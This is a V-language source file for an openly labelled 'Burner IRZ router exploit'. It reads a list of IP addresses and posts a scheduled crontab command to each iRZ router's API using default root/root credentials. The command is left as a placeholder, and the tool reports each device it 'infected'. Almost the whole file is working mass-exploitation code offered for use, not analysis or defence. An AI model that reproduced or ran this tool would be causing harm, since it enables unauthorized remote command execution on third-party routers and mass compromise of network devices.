import os 
import net.http
import json

fn clear(){
	$if linux {
		os.system('clear')
	} $else {
		os.system('cls')
	}
}

fn main(){
	clear()
	print("[40;38;2;207;165;0m██████╗ ██╗   ██╗██████╗ ███╗   ██╗███████╗██████╗  \n")
	print("[40;38;2;212;147;23m██╔══██╗██║   ██║██╔══██╗████╗  ██║██╔════╝██╔══██╗ \n")
	print("[40;38;2;217;129;46m██████╔╝██║   ██║██████╔╝██╔██╗ ██║█████╗  ██████╔╝ \n")
	print("[40;38;2;222;111;69m██╔══██╗██║   ██║██╔══██╗██║╚██╗██║██╔══╝  ██╔══██╗ \n")
	print("[40;38;2;227;93;92m██████╔╝╚██████╔╝██║  ██║██║ ╚████║███████╗██║  ██║ \n")
	print("[40;38;2;232;75;115m╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝ \n")
	print("[40;38;2;237;57;138m[!] Burner IRZ router exploit \n")
	print("[40;38;2;242;39;161m[!] Creator -> cryptdacat    \n")
	print("[40;38;2;247;21;184m[!] Irz router based exploit in v \n")
	file_name := os.input("[40;38;2;247;21;184m[-] Enter your filename with the ips  > ")
	if os.exists('${file_name}'){ 
		ips := os.read_lines("./$file_name") or { panic(err) }
		for i in ips {
			raw_payload := '{"tasks":[{"enable":true,"minutes":"*","hours":"*","days":"*","months":"*","weekdays":"*","command":"ur_command_here"}],"_board":{"name":"RL21","platform":"irz_mt02","time":"Wed Mar 16 16:43:20 UTC 2022"}}'
			payload := json.encode(raw_payload)
			data := {
				"router_user": "root"
				"router_pass": "root"
			}
			mut infect := http.new_request(.post, "http://${i}/api/crontab", "data=${payload}") or { print("[40;38;2;247;21;184m[-] Fatal error: Failed to perform the request") continue }
	        infect.add_header(.authorization, "data=${data}")
	        infect.add_header(.user_agent, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36")
	        infect.add_header(.origin, "${i}")
	        infect.add_header(.referer, "${i}")
	        infect.do() or {
	        	print("[-][40;38;2;247;21;184m Burner can't infect -> ${i}")
	        	continue
	        }
			print("[-][40;38;2;247;21;184m Burner infected -> ${i} \n")
		}
	} else{
		print("[40;38;2;247;21;184m[-] Fatal error : File ${file_name} not found!")
	}
}
